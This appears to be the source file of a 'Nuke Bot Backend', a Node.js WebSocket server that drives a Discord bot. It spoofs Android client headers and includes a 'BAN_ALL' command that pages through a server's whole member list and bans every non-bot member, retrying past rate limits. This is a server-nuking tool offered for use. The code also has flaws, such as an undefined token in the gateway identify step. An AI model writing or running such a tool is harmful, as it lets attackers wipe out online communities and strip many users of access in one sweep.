const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const cors = require('cors');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(express.json());

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

// Root route
app.get('/', (req, res) => {
  res.json({ 
    name: 'Nuke Bot Backend',
    status: 'running',
    endpoints: {
      health: '/health',
      websocket: 'ws://<host>:<port>'
    }
  });
});

// Store active bot connections
const botConnections = new Map();

// Discord API helper
const DISCORD_API = 'https://discord.com/api/v10';
const SUPER_PROPS = 'eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiZGV2aWNlIjoibW9iaWxlIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzKSBBcHBsZVdlYmtpdC81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMjAuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTMiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTAwMDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9';

function discordHeaders(token, isBot = false) {
  return {
    Authorization: (isBot ? 'Bot ' : '') + token,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
    'X-Super-Properties': SUPER_PROPS,
    'X-Discord-Locale': 'en-US',
    'X-Discord-Timezone': 'UTC',
    Accept: '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    Origin: 'https://discord.com',
    Referer: 'https://discord.com/channels/@me',
  };
}

async function discordRequest(method, path, body, token, isBot = false) {
  const res = await fetch(`${DISCORD_API}${path}`, {
    method,
    headers: discordHeaders(token, isBot),
    body: body ? JSON.stringify(body) : undefined,
  });

  if (res.status === 429) {
    const retry = await res.json();
    await new Promise(r => setTimeout(r, (retry.retry_after || 1) * 1000 + 100));
    return discordRequest(method, path, body, token, isBot);
  }

  if (!res.ok) {
    const text = await res.text();
    const err = new Error(`${res.status} ${text.slice(0, 200)}`);
    err.status = res.status;
    throw err;
  }

  if (res.status === 204) return null;
  return res.json();
}

// WebSocket connection handler
wss.on('connection', (ws, req) => {
  console.log('Frontend connected');
  let botWs = null;
  let heartbeatInterval = null;
  let resolved = false;

  const send = (data) => {
    if (ws.readyState === 1) ws.send(JSON.stringify(data));
  };

  const log = (msg) => send({ type: 'LOG', message: msg });

  ws.on('message', async (data) => {
    try {
      const msg = JSON.parse(data);

      if (msg.type === 'CONNECT') {
        const { token, customName } = msg;

        // Validate bot token via REST
        try {
          const me = await discordRequest('GET', '/users/@me', null, token, true);
          log(`✅ Token valid: ${me.username}#${me.discriminator} (${me.id})`);
        } catch (e) {
          log(`❌ Token invalid: ${e.message}`);
          send({ type: 'ERROR', message: e.message });
          return;
        }

        // Connect to Discord gateway
        const gatewayUrl = 'wss://gateway.discord.gg/?v=10&encoding=json';
        log(`Connecting to ${gatewayUrl}`);
        
        botWs = new (require('ws'))(gatewayUrl);
        let heartbeatInterval = null;
        let gatewayResolved = false;
        const timeout = setTimeout(() => {
          if (!gatewayResolved) {
            gatewayResolved = true;
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            log('❌ Gateway timeout (15s)');
            send({ type: 'ERROR', message: 'Gateway connection timeout' });
          }
        }, 15000);

        botWs.on('open', () => log('✅ Gateway connected, waiting for HELLO...'));

        botWs.on('message', async (data) => {
          try {
            const msg = JSON.parse(data);

            if (msg.op === 10) {
              const heartbeat = msg.d.heartbeat_interval;
              log(`✅ HELLO received, heartbeat: ${heartbeat}ms`);

              heartbeatInterval = setInterval(() => {
                if (botWs && botWs.readyState === 1) {
                  botWs.send(JSON.stringify({ op: 1, d: null }));
                }
              }, heartbeat);

              botWs.send(JSON.stringify({
                op: 2,
                d: {
                  token: 'Bot ' + msg.token,
                  intents: 98351,
                  properties: {
                    os: 'Android',
                    browser: 'Discord Android',
                    device: 'mobile',
                  },
                  compress: false,
                  presence: {
                    status: 'online',
                    since: 0,
                    activities: [{ name: msg.customName, type: 0 }],
                    afk: false,
                  },
                },
              }));
              log('📤 IDENTIFY sent');

            } else if (msg.op === 0 && msg.t === 'READY') {
              log('✅ Bot READY on gateway!');
              if (!gatewayResolved) {
                gatewayResolved = true;
                clearTimeout(timeout);
                if (heartbeatInterval) clearInterval(heartbeatInterval);
                send({ type: 'READY' });
              }
            } else if (msg.op === 9) {
              log('❌ Invalid session (op 9)');
              if (!gatewayResolved) {
                gatewayResolved = true;
                clearTimeout(timeout);
                if (heartbeatInterval) clearInterval(heartbeatInterval);
                send({ type: 'ERROR', message: 'Invalid session - check bot token and ensure bot is in a server' });
              }
            } else if (msg.op === 11) {
              // Heartbeat ACK - silent
            }
          } catch (e) {
            log(`Gateway error: ${e.message}`);
          }
        });

        botWs.on('error', (err) => {
          log(`Gateway error: ${err.message}`);
          if (!gatewayResolved) {
            gatewayResolved = true;
            clearTimeout(timeout);
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            send({ type: 'ERROR', message: err.message });
          }
        });

        botWs.on('close', (code, reason) => {
          log(`Gateway closed: ${code} - ${reason || 'none'}`);
          if (heartbeatInterval) clearInterval(heartbeatInterval);
          if (!gatewayResolved) {
            gatewayResolved = true;
            const errorMsg = 
              code === 4004 ? 'Invalid token' :
              code === 4003 ? 'Disallowed intent - enable in Discord Developer Portal' :
              code === 4005 ? 'Invalid intent' :
              code === 4007 ? 'Invalid sequence' :
              code === 4009 ? 'Invalid session' :
              code === 4011 ? 'Bot not in any server - invite it first' :
              `Connection closed (${code})`;
            send({ type: 'ERROR', message: errorMsg });
          }
        });

        // Store connection for later commands
        botConnections.set(ws, { botWs, customName: msg.customName, token: msg.token });

      } else if (msg.type === 'DISCONNECT') {
        if (botWs) {
          botWs.close();
          botWs = null;
        }
      } else if (msg.type === 'COMMAND') {
        // Forward commands to Discord API via REST
        const conn = botConnections.get(ws);
        if (!conn) {
          send({ type: 'ERROR', message: 'Not connected' });
          return;
        }

        try {
          if (msg.command === 'BAN_ALL') {
            // Fast ban implementation
            log('🔨 BAN ALL started...');
            const me = await discordRequest('GET', '/users/@me', null, conn.token, true);
            const members = await getAllMembers(conn.guildId || msg.guildId, conn.token);
            const targets = members.filter(m => !m.user.bot && m.user.id !== me.id);
            log(`Banning ${targets.length} members...`);
            
            let banned = 0;
            for (const m of targets) {
              try {
                await discordRequest('PUT', `/guilds/${msg.guildId}/bans/${m.user.id}`, { delete_message_seconds: 0 }, conn.token, true);
                banned++;
                if (banned % 25 === 0) log(`Banned ${banned}/${targets.length}...`);
              } catch (e) {}
            }
            log(`✅ Banned ${banned} members`);
            send({ type: 'LOG', message: `✅ Banned ${banned} members` });
          }
          // Add more commands as needed
        } catch (e) {
          send({ type: 'ERROR', message: e.message });
        }
      }
    } catch (e) {
      log(`Error: ${e.message}`);
      send({ type: 'ERROR', message: e.message });
    }
  });

  ws.on('close', () => {
    botConnections.delete(ws);
    console.log('Frontend disconnected');
  });
});

async function getAllMembers(guildId, token) {
  const out = [];
  let after = '0';
  while (true) {
    const batch = await discordRequest('GET', `/guilds/${guildId}/members?limit=1000&after=${after}`, null, token, true);
    if (!Array.isArray(batch) || batch.length === 0) break;
    out.push(...batch);
    after = batch[batch.length - 1].user.id;
    if (batch.length < 1000) break;
  }
  return out;
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Backend running on port ${PORT}`);
});